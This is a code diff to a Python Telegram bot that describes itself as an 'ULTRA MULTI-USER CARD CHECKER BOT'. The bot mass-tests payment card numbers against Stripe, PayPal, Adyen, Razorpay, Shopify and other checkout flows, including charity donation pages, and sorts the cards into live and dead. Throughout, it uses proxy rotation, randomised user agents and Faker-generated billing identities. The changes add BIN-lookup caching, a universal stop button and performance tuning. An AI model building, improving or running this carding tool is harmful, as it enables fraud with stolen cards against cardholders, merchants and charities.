+    proxy_fmt = format_proxy_stco(proxy_raw) if proxy_raw else None
+    t = time.perf_counter()
+    _fpk, _fcs, fresh_init, init_resp = await get_fresh_stripe_checkout_data(
+        cs, pk, proxy_fmt
+    )
+    ms = (time.perf_counter() - t) * 1000
+    init_err = ""
+    if not fresh_init:
+        if isinstance(init_resp, dict):
+            init_err = (init_resp.get("error")
+                        or init_resp.get("body", "")[:90]
+                        or f"status {init_resp.get('status')}")
+        else:
+            init_err = str(init_resp)[:90]
+    _stage("4️⃣", "fresh init (curl_cffi)", ms, bool(fresh_init), init_err)
+
+    total_ms = (time.perf_counter() - total_t0) * 1000
+
+    lines += [""]
+    if fresh_init:
+        acc = fresh_init.get("account_settings", {}) or {}
+        merchant = acc.get("display_name") or acc.get("business_name") or "Unknown"
+        lig = fresh_init.get("line_item_group") or {}
+        amount = lig.get("total", 0) or 0
+        lines.append(
+            f"🏪 <b>{html.escape(str(merchant)[:40])}</b> · "
+            f"{amount / 100:.2f} {html.escape(str(lig.get('currency', '') or '').upper())}"
+        )
+        lines.append("🟢 <b>Preflight OK</b> — /stco would send a /confirm here.")
+    else:
+        lines.append(
+            "🔴 <b>Preflight FAILS at fresh init</b> — /stco aborts before "
+            "ever sending /confirm, which is why it answers in ~1s."
+        )
+
+    lines += ["", f"⏱ <b>Total</b> ➳ <b>{_stco_fmt_ms(total_ms)}</b>"]
+
+    try:
+        await message.reply_text(
+            "\n".join(lines)[:4000],
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True,
+        )
+    except Exception as e:
+        await message.reply_text(f"🧭 diag render error: {str(e)[:80]}")
+
 
 
 
@@ -33613,6 +34225,7 @@ async def ezycourse_mass_check_logic(update: Update, context: ContextTypes.DEFAU
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             """Process a single card - runs concurrently with others"""
             nonlocal processed_count, proxy_index
             
@@ -34726,6 +35339,7 @@ async def st1_gateway_mass_check_logic(update: Update, context: ContextTypes.DEF
                     print(f"⚠️ Progress update error: {e}")
 
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
 
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -35621,6 +36235,8 @@ async def strip5_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
 
         async def process_one(card, idx):
             nonlocal processed, proxy_index
+            # back off BEFORE taking a concurrency slot
+            await _resp_yield()
             async with sem:
                 await asyncio.sleep(random.uniform(0.1, 0.3))
 
@@ -36611,6 +37227,8 @@ async def sq_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
 
         async def process_one(card, idx):
             nonlocal processed, proxy_index
+            # back off BEFORE taking a concurrency slot
+            await _resp_yield()
             async with sem:
                 await asyncio.sleep(random.uniform(0.1, 0.3))
 
@@ -37268,6 +37886,8 @@ async def cc_mass_run(update, context, cards: list, progress_msg=None, skip_cred
 
         async def process_one(card, idx):
             nonlocal processed, proxy_index
+            # back off BEFORE taking a concurrency slot
+            await _resp_yield()
             async with sem:
                 await asyncio.sleep(random.uniform(0.1, 0.3))
 
@@ -38019,6 +38639,7 @@ async def adyen_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_T
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -39105,6 +39726,7 @@ async def stripe_pl_mass_check_logic(update: Update, context: ContextTypes.DEFAU
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -39730,7 +40352,7 @@ _US_STATES_PPK = [
     'WV','WI','WY'
 ]
 
-_ppk_fake = Faker()
+_ppk_fake = _FAKE
 
 paypal_key_active_tasks: dict = {}
 
@@ -42309,7 +42931,7 @@ async def get_paypal_donation_50_form_data(proxy: str = None) -> Dict:
 async def create_paypal_donation_50_order(form_data: Dict, proxy: str = None) -> Optional[str]:
     """Create PayPal order and get token"""
     try:
-        fake = Faker()
+        fake = _FAKE
         us = generate_user_agent()
         
         # Configure client
@@ -42423,7 +43045,7 @@ async def check_card_paypal_donation_50(card: str, proxy: str = None, user_id: i
 async def process_paypal_donation_50_payment_with_address(card: str, order_id: str, proxy: str = None) -> Dict:
     """Process payment via PayPal GraphQL with PROPER SHIPPING ADDRESS"""
     try:
-        fake = Faker()
+        fake = _FAKE
         us = generate_user_agent()
         
         # Parse card
@@ -43009,6 +43631,7 @@ async def paypal_donation_50_mass_check_logic(update: Update, context: ContextTy
         processed_count = 0
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -43371,7 +43994,7 @@ async def get_paypal_donation_form_data(proxy: str = None) -> Dict:
 async def create_paypal_donation_order(form_data: Dict, proxy: str = None) -> str:
     """Create PayPal order and get token with proxy support"""
     try:
-        fake = Faker()
+        fake = _FAKE
         headers = {'User-Agent': generate_user_agent()}
         proxy_url = format_proxy(proxy) if proxy else None
         
@@ -43425,7 +44048,7 @@ async def create_paypal_donation_order(form_data: Dict, proxy: str = None) -> st
 async def process_paypal_donation_simple(card: str, token: str, proxy: str = None, retry_count: int = 0) -> Dict:
     """Process PayPal donation with BOTH billing AND shipping addresses"""
     try:
-        fake = Faker()
+        fake = _FAKE
         us = generate_user_agent()
         
         # Parse card
@@ -44072,6 +44695,7 @@ async def paypal_donation_mass_check_logic(update: Update, context: ContextTypes
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count
             
             await asyncio.sleep(random.uniform(1.0, 2.0))  # Delay between cards
@@ -44304,6 +44928,98 @@ async def mass_check_paypal_donation_command(update: Update, context: ContextTyp
     await paypal_donation_mass_check_logic(update, context, cards, None)
     
     
+# ═══════════════════════════════════════════════════════════════════════════
+#  UNIVERSAL MASS-CHECK STOP
+#  One stop path for every gateway: instead of a hard-coded list of task
+#  dicts, scan globals() for "*_active_tasks" and drop the user from all of
+#  them. New gateways are covered automatically.
+# ═══════════════════════════════════════════════════════════════════════════
+
+def _stop_everything_for_user(uid: int) -> list:
+    """Remove ``uid`` from every active mass-check registry."""
+    stopped = []
+    try:
+        items = list(globals().items())
+    except Exception:
+        items = []
+    for name, obj in items:
+        if not name.endswith("_active_tasks") or not isinstance(obj, dict):
+            continue
+        if uid in obj:
+            try:
+                obj.pop(uid, None)
+                stopped.append(name[: -len("_active_tasks")])
+            except Exception:
+                pass
+    for extra in ("running_mass_checks", "user_stop_flags"):
+        d = globals().get(extra)
+        if isinstance(d, dict) and uid in d:
+            try:
+                d.pop(uid, None)
+                stopped.append(extra)
+            except Exception:
+                pass
+    return stopped
+
+
+def create_progress_buttons(current: int = 0, total: int = 0, live: int = 0,
+                            dead: int = 0, label: str = "",
+                            status_text: str = "") -> InlineKeyboardMarkup:
+    """Progress keyboard for the mass flows that used to call this helper.
+
+    NOTE: the definition had been lost from this file, so those flows raised
+    NameError on start and had no Stop button at all.
+    """
+    rows = []
+    if total:
+        rows.append([
+            InlineKeyboardButton(f"Live ({live})", callback_data="mstop_noop",
+                                 style='success', icon_custom_emoji_id=MASS_CHECK_BUTTON_ICONS["live"]),
+            InlineKeyboardButton(f"Dead ({dead})", callback_data="mstop_noop",
+                                 style='danger', icon_custom_emoji_id=MASS_CHECK_BUTTON_ICONS["dead"]),
+        ])
+        rows.append([
+            InlineKeyboardButton(f"Progress ({current}/{total})",
+                                 callback_data="mstop_noop", style='primary',
+                                 icon_custom_emoji_id=MASS_CHECK_BUTTON_ICONS["all"]),
+        ])
+    rows.append([
+        InlineKeyboardButton("Stop Checking", callback_data="mstop_self",
+                             style='danger', icon_custom_emoji_id=MASS_CHECK_BUTTON_ICONS["stop"]),
+    ])
+    return InlineKeyboardMarkup(rows)
+
+
+async def universal_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stop handler shared by every mass keyboard.
+
+    Covers:
+      • ``mstop_self`` / ``mstop_noop``  — the generic keyboard above
+      • ``autosopi_stop_{uid}_{sid}``    — /msh & the other *build_progress_keyboard* flows
+    The clicking user can only stop their own runs.
+    """
+    query = update.callback_query
+    data = query.data or ""
+
+    if data == "mstop_noop":
+        await query.answer()
+        return
+
+    uid = update.effective_user.id
+    stopped = _stop_everything_for_user(uid)
+
+    if stopped:
+        await query.answer("🛑 Stopping…")
+    else:
+        await query.answer("Nothing running.")
+
+    # drop the keyboard so it can't be pressed twice
+    try:
+        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([]))
+    except Exception:
+        pass
+
+
 def stop_markup(user_id: int) -> InlineKeyboardMarkup:
     """Create stop button markup for mass checks"""
     keyboard = [
@@ -44324,38 +45040,9 @@ async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_id = int(data.split('_')[1])
         
         # Stop all active sessions for this user
-        stopped_sessions = []
-        
-        # List of all active task dictionaries
-        task_dicts = [
-            ("PayPal", paypal_active_tasks),
-            ("Shopify", shopify_active_tasks),
-            ("Razorpay", razorpay_active_tasks),
-            ("Stripe Charge", stripe_charge_active_tasks),
-            ("Stripe Charge V2", stripe_charge_v2_active_tasks if 'stripe_charge_v2_active_tasks' in globals() else {}),
-            ("Stripe Auth", stripe_auth_active_tasks),
-            ("Braintree", braintree_active_tasks),
-            ("Autosopi", autosopi_active_tasks),
-            ("Payflow", payflow_active_tasks),
-            ("B3Charged", b3charged_active_tasks),
-            ("Adyen Direct", adyen_direct_active_tasks),
-            ("Auto Stripe", auto_stripe_active_tasks),
-            ("MSH Shopify", msh_active_tasks if 'msh_active_tasks' in globals() else {}),
-            ("ST1", st1_active_tasks if 'st1_active_tasks' in globals() else {}),
-            ("Stripe PL", stripe_pl_active_tasks if 'stripe_pl_active_tasks' in globals() else {}),
-            ("PayPal Donation", paypal_donation_active_tasks if 'paypal_donation_active_tasks' in globals() else {}),
-            ("Razorpay Gate2", razorpay_active_tasks),
-        ]
-        
-        for gateway_name, task_dict in task_dicts:
-            if target_id in task_dict:
-                task_dict.pop(target_id, None)
-                stopped_sessions.append(gateway_name)
-        
-        # Stop mass check if running
-        if target_id in running_mass_checks:
-            running_mass_checks.pop(target_id, None)
-            stopped_sessions.append("Mass Check")
+        # Universal: drop the user from EVERY *_active_tasks dict, so
+        # every gateway (including new ones) is covered automatically.
+        stopped_sessions = _stop_everything_for_user(target_id)
         
         if stopped_sessions:
             msg = f"🛑 <b>Session Stopped!</b>\n\n✅ Stopped: {', '.join(stopped_sessions)}"
@@ -51158,6 +51845,7 @@ async def run_shopify_multi_check(update: Update, context: ContextTypes.DEFAULT_
                     print(f"⚠️ [/sh multi] edit failed: {e2}")
 
         for card in cards:
+            await _resp_yield()
             try:
                 site = autosopi_site_manager.get_next_site_weighted()
                 if not site:
@@ -56612,6 +57300,7 @@ async def razorpay2_mass_check_logic(update, context, cards, progress_msg=None):
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -58102,6 +58791,7 @@ async def razorpay_gate2_mass_check_logic(update: Update, context: ContextTypes.
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -59177,6 +59867,7 @@ async def stripe_4usd_mass_check_logic(update: Update, context: ContextTypes.DEF
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             async with semaphore:
@@ -60726,6 +61417,7 @@ async def mass_check_stripe_chk_logic(update: Update, context: ContextTypes.DEFA
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -63478,6 +64170,7 @@ async def mass_check_princess_logic(update: Update, context: ContextTypes.DEFAUL
                 pass
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -65146,7 +65839,7 @@ async def get_dabbagh_client_secret(card: str, proxy: str = None) -> Optional[st
     for attempt_proxy in proxy_attempts:
         try:
             us = generate_user_agent()
-            fake = Faker()
+            fake = _FAKE
             
             # Parse card for validation only
             parts = card.split('|')
@@ -65314,7 +66007,7 @@ async def confirm_stripe_payment(card: str, client_secret: str, proxy: str = Non
     for attempt_proxy in proxy_attempts:
         try:
             us = generate_user_agent()
-            fake = Faker()
+            fake = _FAKE
             
             # Parse card
             parts = card.split('|')
@@ -65811,6 +66504,7 @@ async def dabbagh_mass_check_logic(update: Update, context: ContextTypes.DEFAULT
                 pass
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -66119,7 +66813,7 @@ async def create_united_way_payment_method(card: str, proxy: str = None) -> Opti
     """Create Stripe payment method and return payment method ID"""
     try:
         us = generate_user_agent()
-        fake = Faker()
+        fake = _FAKE
         
         # Parse card
         parts = card.split('|')
@@ -66186,7 +66880,7 @@ async def process_united_way_donation(card: str, form_data: Dict, pm_id: str, pr
     """Process donation with the payment method"""
     try:
         us = generate_user_agent()
-        fake = Faker()
+        fake = _FAKE
         
         name = fake.name()
         first_name = name.split()[0] if ' ' in name else name
@@ -66740,6 +67434,7 @@ async def united_way_mass_check_logic(update: Update, context: ContextTypes.DEFA
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -69582,6 +70277,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         #  PROCESS SINGLE CARD
         # ══════════════════════════════════════════════════════════════
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal proxy_rotation_counter, processed_count
 
             async with semaphore:
@@ -71389,7 +72085,7 @@ async def check_card_stripe_charge_v2(card: str, proxy: str = None, retry_count:
                 print(f"⚠️ Could not format proxy, continuing without proxy")
                 proxy_url = None
         
-        fake = Faker()
+        fake = _FAKE
         first_name = fake.first_name()
         last_name = fake.last_name()
         
@@ -75168,15 +75864,123 @@ PREMIUM_EMOJI_IDS_BIN = {
  
 
 
+# ── BIN lookup cache ────────────────────────────────────────────────────
+# Each card used to trigger an HTTP round-trip + JSON parse. Results only
+# depend on the 6-digit BIN, so cache them: mass checks stop paying that cost
+# after the first card of each BIN.
+_BIN_INFO_CACHE: Dict[str, tuple] = {}
+_BIN_INFO_CACHE_MAX = 4000
+
+
 async def get_bin_info(cc: str, user_id: int = None) -> tuple:
+    """Cached wrapper around _get_bin_info_uncached()."""
+    bin_num = str(cc or "")[:6]
+    hit = _BIN_INFO_CACHE.get(bin_num)
+    if hit is not None:
+        return hit
+    res = await _get_bin_info_uncached(cc, user_id)
+    if isinstance(res, tuple) and len(res) == 5:
+        if len(_BIN_INFO_CACHE) >= _BIN_INFO_CACHE_MAX:
+            _BIN_INFO_CACHE.clear()
+        _BIN_INFO_CACHE[bin_num] = res
+    return res
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  LOCAL BIN DATABASE  (local-first lookup)
+#  Order is now:  memory cache → local DB → built-in table → API → guess.
+#  Every successful API answer is written back here, so each BIN only costs
+#  one network call ever (and survives restarts).
+# ═══════════════════════════════════════════════════════════════════════════
+
+BIN_DB_FILE = data_path("bin_database.json")
+_BIN_LOCAL_DB: Dict[str, tuple] = {}
+_BIN_DB_MAX = 50000
+_BIN_DB_LAST_SAVE = 0.0
+
+# Banks that are just placeholders — never "known" from the built-in table
+_BIN_GENERIC_BANKS = {
+    "test card", "mastercard bank", "visa bank", "american express",
+    "discover bank", "unknown bank", "unknown", "",
+}
+
+
+def _bin_db_load() -> None:
+    global _BIN_LOCAL_DB
+    try:
+        if Path(BIN_DB_FILE).exists():
+            with open(BIN_DB_FILE, "r", encoding="utf-8") as f:
+                raw = json.load(f)
+            if isinstance(raw, dict):
+                _BIN_LOCAL_DB = {
+                    k: tuple(v) for k, v in raw.items()
+                    if isinstance(v, (list, tuple)) and len(v) == 5
+                }
+            print(f"📦 Local BIN database: {len(_BIN_LOCAL_DB)} entries")
+    except Exception as e:
+        print(f"⚠️ BIN database load failed: {e}")
+
+
+def _bin_db_save(force: bool = False) -> None:
+    global _BIN_DB_LAST_SAVE
+    now = time.time()
+    if not force and now - _BIN_DB_LAST_SAVE < 5:
+        return
+    _BIN_DB_LAST_SAVE = now
+    try:
+        if len(_BIN_LOCAL_DB) > _BIN_DB_MAX:
+            for k in list(_BIN_LOCAL_DB)[: len(_BIN_LOCAL_DB) - _BIN_DB_MAX]:
+                _BIN_LOCAL_DB.pop(k, None)
+        with open(BIN_DB_FILE, "w", encoding="utf-8") as f:
+            json.dump(_BIN_LOCAL_DB, f)
+    except Exception as e:
+        print(f"⚠️ BIN database save failed: {e}")
+
+
+def _bin_db_put(bin_num: str, info: tuple) -> None:
+    if isinstance(info, tuple) and len(info) == 5:
+        _BIN_LOCAL_DB[bin_num] = info
+        _bin_db_save()
+
+
+def _bin_known_locally(bin_num: str) -> bool:
+    """True only when the built-in table has a REAL bank for this BIN."""
+    name = LOCAL_BIN_BANKS.get(bin_num[:6])
+    if not name:
+        return False
+    return name.strip().lower() not in _BIN_GENERIC_BANKS
+
+
+_bin_db_load()
+
+
+async def _get_bin_info_uncached(cc: str, user_id: int = None) -> tuple:
     """
-    Get BIN info directly from antipublic API with fallback to local detection
+    Local-first BIN lookup.
+
+    Order:
+      1. local database  (instant, works offline)
+      2. built-in table  (instant, only for REAL banks)
+      3. API             (first time this BIN is ever seen)
+      4. prefix guess    (API failed)
     """
-    bin_num = cc[:6]
-    
+    bin_num = str(cc or "")[:6]
+
     if not bin_num.isdigit() or len(bin_num) != 6:
         return _get_fallback_bin_info(bin_num)
-    
+
+    # ── 1) local database ───────────────────────────────────────────────
+    local = _BIN_LOCAL_DB.get(bin_num)
+    if local:
+        return local
+
+    # ── 2) built-in table (no network) ──────────────────────────────────
+    if _bin_known_locally(bin_num):
+        res = _get_fallback_bin_info(bin_num)
+        _bin_db_put(bin_num, res)
+        print(f"⚡ BIN local hit: {bin_num} -> {res[1]}")
+        return res
+
     try:
         # Use antipublic API (no proxy needed)
         api_url = f"https://bins.antipublic.cc/bins/{bin_num}"
@@ -75212,7 +76016,9 @@ async def get_bin_info(cc: str, user_id: int = None) -> tuple:
             country_display = f"{flag} {country_name}"
             
             print(f"✅ BIN lookup success: {bin_num} -> {bin_info} | {bank} | {country_display}")
-            return (bin_info, bank, country_display, currency, country_code)
+            result = (bin_info, bank, country_display, currency, country_code)
+            _bin_db_put(bin_num, result)     # learned → instant next time
+            return result
         else:
             print(f"⚠️ BIN API returned {response.status_code}, using fallback")
             return _get_fallback_bin_info(bin_num)
@@ -75271,23 +76077,26 @@ def _get_brand_from_bin(bin_num: str) -> str:
         return "UNKNOWN - CREDIT"
 
 
+# Built-in BIN → bank table (local-first source of truth for known BINs)
+LOCAL_BIN_BANKS = {
+    '414720': 'Chase Bank',
+    '414721': 'Chase Bank',
+    '426684': 'Barclays Bank',
+    '497049': 'Bank of America',
+    '431324': 'J.P. MORGAN EUROPE LTD.',
+    '411111': 'Test Card',
+    '400000': 'Test Card',
+    '422222': 'Test Card',
+    '424242': 'Test Card',
+    '518575': 'Mastercard Bank',
+    '515367': 'Mastercard Bank',
+}
+
+
 def _get_bank_from_bin(bin_num: str) -> str:
     """Get bank name from BIN (simplified fallback)"""
-    # Common BIN ranges
-    bin_ranges = {
-        '414720': 'Chase Bank',
-        '414721': 'Chase Bank',
-        '426684': 'Barclays Bank',
-        '497049': 'Bank of America',
-        '431324': 'J.P. MORGAN EUROPE LTD.',
-        '411111': 'Test Card',
-        '400000': 'Test Card',
-        '422222': 'Test Card',
-        '424242': 'Test Card',
-        '518575': 'Mastercard Bank',
-        '515367': 'Mastercard Bank',
-    }
-    
+    bin_ranges = LOCAL_BIN_BANKS
+
     if bin_num in bin_ranges:
         return bin_ranges[bin_num]
     if bin_num[:4] in bin_ranges:
@@ -76142,7 +76951,7 @@ async def whop_hit(checkout_url: str, card_str: str,
     cookie = whop_build_cookie(session_id, client_secret, sig_id)
 
     # ── Fake billing — 50 states only, zip matched to state ────────────
-    fake = Faker()
+    fake = _FAKE
     fn, ln = fake.first_name(), fake.last_name()
     state  = random.choice(_US_STATES)
     try:
@@ -77483,6 +78292,7 @@ async def sc_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE
                 pass
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -81389,6 +82199,7 @@ async def paypal_mass_check_with_pool(update: Update, context: ContextTypes.DEFA
                 pass
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             """Process a single card"""
             nonlocal processed_count
             
@@ -83191,6 +84002,7 @@ async def mass_check_stripe_auth0_logic(update: Update, context: ContextTypes.DE
                     print(f"⚠️ Progress update error: {e}")
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -85530,7 +86342,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
         stripe_sid = str(uuid.uuid4())
         
         # Parse card for name/email
-        fake = Faker()
+        fake = _FAKE
         first_name = fake.first_name()
         last_name = fake.last_name()
         email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 9999)}@gmail.com"
@@ -86198,6 +87010,7 @@ async def mass_check_stripe_1usd_logic(update: Update, context: ContextTypes.DEF
                 pass
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -87277,6 +88090,7 @@ async def mass_check_st1_charge_logic(update: Update, context: ContextTypes.DEFA
                 pass
 
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
             await asyncio.sleep(random.uniform(0.1, 0.3))
             async with semaphore:
@@ -87922,6 +88736,183 @@ async def rmbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                  parse_mode=ParseMode.HTML)
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  /perf  —  owner-only CPU / memory breakdown
+#  Shows which THREAD and which CHILD PROCESS (e.g. a stray Chromium from
+#  Playwright) is actually burning the CPU, so no guessing is needed.
+# ═══════════════════════════════════════════════════════════════════════════
+
+async def perf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Owner-only: /perf [seconds] — where is the CPU going?"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+
+    window = 2.0
+    if context.args:
+        try:
+            window = max(1.0, min(30.0, float(context.args[0])))
+        except (TypeError, ValueError):
+            pass
+
+    proc = psutil.Process()
+
+    def _snap_threads():
+        return {t.id: (t.user_time + t.system_time) for t in proc.threads()}
+
+    def _snap_children():
+        out = {}
+        try:
+            for c in proc.children(recursive=True):
+                try:
+                    ct = c.cpu_times()
+                    out[c.pid] = (c.name(), ct.user + ct.system,
+                                  c.memory_info().rss)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        return out
+
+    proc.cpu_percent(None)                     # prime the counter
+    t1, c1 = _snap_threads(), _snap_children()
+    await asyncio.sleep(window)
+    t2, c2 = _snap_threads(), _snap_children()
+    cpu = proc.cpu_percent(None)
+    mem = proc.memory_info()
+
+    names = {t.ident: t.name for t in threading.enumerate()}
+
+    rows = []
+    for tid, val in t2.items():
+        delta = max(0.0, val - t1.get(tid, val))
+        rows.append((delta, names.get(tid, f"tid-{tid}")))
+    rows.sort(reverse=True)
+
+    kids = []
+    for pid, (cname, cval, rss) in c2.items():
+        prev = c1.get(pid)
+        if not prev:
+            continue
+        delta = max(0.0, cval - prev[1])
+        kids.append((delta, cname, rss))
+    kids.sort(reverse=True)
+
+    loop = asyncio.get_running_loop()
+    tasks = asyncio.all_tasks(loop)
+    coros = {}
+    for t in tasks:
+        try:
+            q = t.get_coro().__qualname__
+        except Exception:
+            continue
+        coros[q] = coros.get(q, 0) + 1
+    top_coros = sorted(coros.items(), key=lambda kv: kv[1], reverse=True)[:6]
+
+    bar = "━━━━━━━━━━━━━━━━━━━"
+    lines = [
+        f"📊 <b>Bot performance</b> · window {window:.0f}s",
+        bar,
+        f"CPU : <b>{cpu:.1f}%</b>  <i>(100% = one core)</i>",
+        f"RSS : <b>{mem.rss / 1048576:.0f} MB</b>",
+        f"Threads : <b>{len(t2)}</b>   asyncio tasks : <b>{len(tasks)}</b>",
+        f"Child procs : <b>{len(c2)}</b>",
+    ]
+
+    if rows:
+        lines += [bar, "<b>Busiest threads</b>"]
+        shown = 0
+        for delta, name in rows:
+            if delta <= 0.01 or shown >= 6:
+                continue
+            lines.append(f"  {name[:26]} — <b>{delta / window * 100:.0f}%</b>")
+            shown += 1
+        if shown == 0:
+            lines.append("  <i>all idle</i>")
+
+    if kids:
+        lines += [bar, "<b>Child processes (Chromium etc.)</b>"]
+        for delta, cname, rss in kids[:6]:
+            lines.append(
+                f"  {cname[:22]} — <b>{delta / window * 100:.0f}%</b> · "
+                f"{rss / 1048576:.0f} MB"
+            )
+
+    lines += [bar, "<b>Top coroutines</b>"]
+    if top_coros:
+        for q, n in top_coros:
+            lines.append(f"  {q[:34]} ×{n}")
+    else:
+        lines.append("  <i>none</i>")
+
+    lines += [bar, f"⚡ {_resp_stats()}"]
+    lines += ["💡 90%+ in one thread → that loop; high child procs → stray browser"]
+
+    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  RESPONSIVENESS RESERVE  (keeps replies fast while mass checks run)
+#  Concurrency is untouched. Heavy per-card workers call _resp_yield() which
+#  only sleeps when a user-facing update is being served or the loop is
+#  stalled, so interactive commands always get a clean slice of the loop.
+# ═══════════════════════════════════════════════════════════════════════════
+
+_LOOP_LAG_MS       = 0.0    # measured event-loop stall (ms)
+_INTERACTIVE_UNTIL = 0.0    # monotonic time until which replies get priority
+_RESP_WINDOW_S     = 1.2    # how long a reply keeps priority
+_RESP_YIELD_S      = 0.03   # tiny back-off applied to mass workers
+_LAG_HIGH_MS       = 100.0  # loop considered stalled above this (ms)
+
+
+def _resp_arm(seconds: float = None) -> None:
+    """Give incoming user-facing updates a priority window."""
+    global _INTERACTIVE_UNTIL
+    w = _RESP_WINDOW_S if seconds is None else seconds
+    _INTERACTIVE_UNTIL = max(_INTERACTIVE_UNTIL, time.monotonic() + w)
+
+
+async def _resp_yield() -> None:
+    """Called by heavy workers before each card. Costs ~0 when idle."""
+    now = time.monotonic()
+    if now < _INTERACTIVE_UNTIL:
+        await asyncio.sleep(_RESP_YIELD_S)
+    elif _LOOP_LAG_MS > _LAG_HIGH_MS:
+        await asyncio.sleep(0.01)
+
+
+async def _resp_monitor() -> None:
+    """Measures event-loop stall so workers can back off when it matters."""
+    global _LOOP_LAG_MS
+    while True:
+        t0 = time.perf_counter()
+        await asyncio.sleep(0.2)
+        drift = (time.perf_counter() - t0 - 0.2) * 1000.0
+        measured = drift if drift > 0 else 0.0
+        # keep a stall visible for a few cycles (decay ~1s) instead of
+        # letting the very next healthy tick hide it
+        _LOOP_LAG_MS = max(measured, _LOOP_LAG_MS * 0.6)
+
+
+async def _resp_probe(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Runs first for every update (group -2). Arms the priority window."""
+    try:
+        if update.callback_query is not None:
+            _resp_arm(0.6)
+            return
+        msg = update.effective_message
+        if msg is not None and getattr(msg, "text", None):
+            _resp_arm()
+    except Exception:
+        pass
+
+
+def _resp_stats() -> str:
+    """One-line status used by /perf."""
+    left = max(0.0, _INTERACTIVE_UNTIL - time.monotonic())
+    return f"loop lag <b>{_LOOP_LAG_MS:.0f} ms</b> · priority window <b>{left:.1f}s</b>"
+
+
 def main():
     print("=" * 80)
     print("💰 ULTRA MULTI-USER CARD CHECKER BOT - v3.0")
@@ -87979,6 +88970,9 @@ def main():
     app.bot_data['flood_control'] = flood_control
     
     async def post_init(application):
+        # keep a slice of the loop free for replies
+        asyncio.create_task(_resp_monitor())
+        print("✅ Responsiveness reserve active")
         await flood_control.start_async()
         try:
             await task_scheduler.start()
@@ -87988,6 +88982,16 @@ def main():
     
     app.post_init = post_init
     
+    # ============ RESPONSIVENESS PROBE (runs before everything, group -2) ====
+    try:
+        from telegram.ext import TypeHandler as _TypeHandler
+        app.add_handler(_TypeHandler(Update, _resp_probe), group=-2)
+        print("✅ Responsiveness probe (TypeHandler) registered")
+    except Exception as _e:
+        print(f"⚠️ TypeHandler unavailable ({_e}); using MessageHandler fallback")
+        app.add_handler(MessageHandler(filters.ALL, _resp_probe), group=-2)
+        app.add_handler(CallbackQueryHandler(_resp_probe), group=-2)
+
     # ============ BAN FALLBACK HANDLER ============
     _ban_reply_cooldown = {}  # user_id -> last time we sent the ban notice
 
@@ -88074,6 +89078,7 @@ def main():
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("status", status_command))
